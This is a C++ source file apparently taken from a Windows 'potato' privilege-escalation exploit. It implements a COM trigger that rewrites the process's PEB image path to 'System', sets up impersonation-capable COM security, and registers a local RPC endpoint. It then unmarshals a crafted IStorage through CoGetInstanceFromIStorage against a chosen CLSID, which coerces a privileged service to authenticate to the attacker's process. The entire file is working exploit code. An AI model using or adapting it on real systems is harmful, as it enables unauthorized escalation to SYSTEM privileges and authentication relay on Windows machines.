#include "PotatoTrigger.h"
#include "stdio.h"
#include "wincrypt.h"
#include "objbase.h"
#include "IUnknownObj.h"
#include "IStorageTrigger.h"

#pragma comment (lib, "Crypt32.lib")
#pragma comment (lib, "Rpcrt4.lib")

char gOxid[8];
char gOid[8];
char gIpid[16];

void InitComServer() {
	PROCESS_BASIC_INFORMATION pebInfo;
	SOLE_AUTHENTICATION_SERVICE authInfo;
	ULONG ReturnLength = 0;
	wchar_t oldImagePathName[MAX_PATH];
	wchar_t newImagePathName[] = L"System";
	WCHAR spnInfo[] = L"";
	pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQueryInformationProcess");
	NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &pebInfo, sizeof(pebInfo), &ReturnLength);
	// save the old image path name and patch with the new one
	memset(oldImagePathName, 0, sizeof(wchar_t) * MAX_PATH);
	memcpy(oldImagePathName, pebInfo.PebBaseAddress->ProcessParameters->ImagePathName.Buffer, pebInfo.PebBaseAddress->ProcessParameters->ImagePathName.Length);
	memcpy(pebInfo.PebBaseAddress->ProcessParameters->ImagePathName.Buffer, newImagePathName, sizeof(newImagePathName));
	// init COM runtime
	CoInitialize(NULL);
	authInfo.dwAuthnSvc = RPC_C_AUTHN_WINNT;
	authInfo.pPrincipalName = spnInfo;
	CoInitializeSecurity(NULL, 1, &authInfo, NULL, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING, NULL);
	// Restore PEB ImagePathName
	memcpy(pebInfo.PebBaseAddress->ProcessParameters->ImagePathName.Buffer, oldImagePathName, pebInfo.PebBaseAddress->ProcessParameters->ImagePathName.Length);
}

// this is the implementation of the "local" potato trigger discovered by @tiraniddo --> https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html
void PotatoTrigger(PWCHAR clsidStr, PWCHAR comPort, HANDLE hEventWait) {
	IMoniker* monikerObj;
	IBindCtx* bindCtx;
	IUnknown* IUnknownObj1Ptr;
	RPC_STATUS rpcStatus;
	HRESULT result;
	PWCHAR objrefBuffer = (PWCHAR)CoTaskMemAlloc(DEFAULT_BUFLEN);
	char* objrefDecoded = (char*)CoTaskMemAlloc(DEFAULT_BUFLEN);
	DWORD objrefDecodedLen = DEFAULT_BUFLEN;
	// Init COM server
	InitComServer();
	// we create a random IUnknown object as a placeholder to pass to the moniker
	IUnknownObj IUnknownObj1 = IUnknownObj();
	IUnknownObj1.QueryInterface(IID_IUnknown, (void**)&IUnknownObj1Ptr);
	result = CreateObjrefMoniker(IUnknownObj1Ptr, &monikerObj);
	if (result != S_OK) {
		printf("[!] CreateObjrefMoniker failed with HRESULT %d\n", result);
		exit(-1);
	}
	CreateBindCtx(0, &bindCtx);
	monikerObj->GetDisplayName(bindCtx, NULL, (LPOLESTR*)&objrefBuffer);
	//printf("[*] Objref Moniker Display Name = %S\n", objrefBuffer);
	// the moniker is in the format objref:[base64encodedobject]: so we skip the first 7 chars and the last colon char
	base64Decode(objrefBuffer + 7, (int)(wcslen(objrefBuffer) - 7 - 1), objrefDecoded, &objrefDecodedLen);
	// we copy the needed data to communicate with our local com server (this process)
	memcpy(gOxid, objrefDecoded + 32, 8);
	memcpy(gOid, objrefDecoded + 40, 8);
	memcpy(gIpid, objrefDecoded + 48, 16);
	// we register the port of our local com server
	rpcStatus = RpcServerUseProtseqEp((RPC_WSTR)L"ncacn_ip_tcp", RPC_C_PROTSEQ_MAX_REQS_DEFAULT, (RPC_WSTR)comPort, NULL);
	if (rpcStatus != S_OK) {
		printf("[!] RpcServerUseProtseqEp failed with rpc status code %d\n", rpcStatus);
		exit(-1);
	}
	RpcServerRegisterAuthInfo(NULL, RPC_C_AUTHN_WINNT, NULL, NULL);
	result = UnmarshallIStorage(clsidStr);
	if (result == CO_E_BAD_PATH) {
		printf("[!] CLSID %S not found. Error Bad path to object. Exiting...\n", clsidStr);
		exit(-1);
	}
	if (hEventWait) WaitForSingleObject(hEventWait, 1000);
	IUnknownObj1Ptr->Release();
	IUnknownObj1.Release();
	bindCtx->Release();
	monikerObj->Release();
	CoTaskMemFree(objrefBuffer);
	CoTaskMemFree(objrefDecoded);
	CoUninitialize();
}

HRESULT UnmarshallIStorage(PWCHAR clsidStr) {
	IStorage* stg = NULL;
	ILockBytes* lb = NULL;
	MULTI_QI qis[1];
	CLSID targetClsid;
	HRESULT result;
	//Create IStorage object
	CreateILockBytesOnHGlobal(NULL, TRUE, &lb);
	StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);
	//Initialze IStorageTrigger object
	IStorageTrigger* IStorageTriggerObj = new IStorageTrigger(stg);
	CLSIDFromString(clsidStr, &targetClsid);
	qis[0].pIID = &IID_IUnknown;
	qis[0].pItf = NULL;
	qis[0].hr = 0;
	//printf("[*] Calling CoGetInstanceFromIStorage with CLSID:%S\n", clsidStr);
	result = CoGetInstanceFromIStorage(NULL, &targetClsid, NULL, CLSCTX_LOCAL_SERVER, IStorageTriggerObj, 1, qis);
	return result;
}

void base64Decode(PWCHAR b64Text, int b64TextLen, char* buffer, DWORD* bufferLen) {
	if (!CryptStringToBinaryW(b64Text, b64TextLen, CRYPT_STRING_BASE64, (BYTE*)buffer, (DWORD*)bufferLen, NULL, NULL)) {
		printf("[!] CryptStringToBinaryW failed with error code %d\n", GetLastError());
		exit(-1);
	}
}

